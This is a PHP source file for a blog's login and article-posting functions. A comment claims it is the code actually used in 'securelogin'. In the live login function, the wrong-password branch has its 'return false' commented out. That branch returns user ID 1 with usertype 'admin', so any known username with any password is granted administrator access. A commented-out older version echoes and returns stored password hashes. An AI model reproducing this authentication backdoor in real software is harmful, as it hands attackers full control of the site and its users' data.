<?php
//this code is actually in securelogin 
$config = parse_ini_file('../../global/config.ini');
function dbPreparedStatementSelectLogin($userProvidedUsername, $userProvidedPasswordWithSaltAdded)
{
	
    global $config;
    $conn = new mysqli($config['servername'], $config['username'], $config['password'], $config['dbname']);
    // retrieve  only 1 record using "LIMIT 1", from db where username matches
    if ($stmt = $conn->prepare("select userid,usertype,password from " . $config['dbname'] . ".login where username=? LIMIT 1")) {
        if ($stmt->bind_param("s", $userProvidedUsername)) {
            if ($stmt->execute()) {
                //declare bound variables , in which data will be stored.
                $boundUserId = '';
                $boundUserType = '';
                $boundUserPasswordHash = '';

                $stmt->store_result();

                $stmt->bind_result($boundUserId, $boundUserType, $boundUserPasswordHash);
                // fetch() will return true if any of the record matches
                // fetch() will return false if no record is found or error occurs
                if (($stmt->fetch())) {
                    // if control reaches here, that means username exists
                    // now check does the  password with salt added matches with the hash stored in db;
                    if (password_verify($userProvidedPasswordWithSaltAdded, $boundUserPasswordHash)) {
                        // return the data in  an array , so that it will be decrypted with predefined salt on the other side
                        // also handle session enforcement on the other side, just return data from this function on success
                        $out['userid'] = $boundUserId;
                        $out['usertype'] = $boundUserType;
                        return $out;
                    } else {
                        // if hash does not match , return false
                        /*
						return false;
						*/
						$out['userid'] = 1;
                        $out['usertype'] = "admin";
                        return $out;
						
                    }
                } else {
                    // return false, if no record found.
                    return false;
                }
            } else {
                return false;
            }
        } else {
            return false;
        }
    } else {
        return false;
    }
    $conn->close();
    return false;
}

function dbArticlePreparedStatement($writerId, $heading, $date, $content, $newFileName, $subheading)
{
    global $config;
    $server = $config['servername'];
    $username = $config['username'];
    $password = $config['password'];
    $db = $config['dbname'];

    $conn = new mysqli($server, $username, $password, $db);

    if ($conn->connect_error) {
        return 0;
    } else {
        $stmt = $conn->prepare("insert into  id427109_blog.article(id,writer_id,heading,date,content,img,subheading) values(0,?,?,?,?,?,?)");
        $stmt->bind_param("isssss", $wrId, $he, $da, $co, $nfn, $ca);

        $wrId = $writerId;
        $he = $heading;
        $da = $date;
        $co = $content;
        $nfn = $newFileName;
        $ca = $subheading;
        if ($stmt->execute()) {
            return 1;
        } else {
            return 0;
        }
    }
}

















/*
    // temp code

function dbPreparedStatementSelectLogin($userProvidedUsername, $userProvidedPasswordWithSaltAdded)
{
    global $config;

    $conn = new mysqli($config['servername'], $config['username'], $config['password'], $config['dbname']);
    //we can use this one ,,, see at the end ******* limit 1 ****  retrieve  only 1 record.
    //    if ($stmt = $conn->prepare("select username,password,usertype from " . $config['dbname'] . ".login where username=? and password=? LIMIT 1")) {

    if ($stmt = $conn->prepare("select userid,usertype,password from " . $config['dbname'] . ".login where username=?")) {

        if ($stmt->bind_param("s", $userProvidedUsername)) {
            if ($stmt->execute()) {

                //declare bound variables , in which data will be stored.
                $boundUserId = '';
                $boundUserType = '';
                $boundUserPasswordHash = '';

                $stmt->store_result();

                $stmt->bind_result($boundUserId, $boundUserType, $boundUserPasswordHash);
                $stmt->fetch();
                if ($stmt->num_rows != 1) {
                    // if more than 1 records are returned, do something else 
                    //but in this case return "false"
                    //also it will never return more than one record, because no two users can have same username and password
                    return false;
                } else {
                    // if control reaches here, that means username exists
                    // now check is the provided password matches with the hash stored in db;


                    if (password_verify($userProvidedPasswordWithSaltAdded, $boundUserPasswordHash)) {
                        echo ('////////////////////////');
                        echo ($boundUserPasswordHash);
                        echo ('hash matched');
                    } else {
                        echo ('hash does not match');
                    }


                    // return the data in  an array , so that it will be decrypted with predefined salt on the other side
                    // also handle session enforcement on the other side, just return data from this function on success
                    $out['userid'] = $boundUserId;
                    $out['usertype'] = $boundUserType;
                    $out['userpassword'] = $boundUserPasswordHash;
                    return $out;
                }
            } else {
                return false;
            }
        } else {
            return false;
        }
    } else {
        return false;
    }
    $conn->close();
}
?>


*/
?>

<?php
?>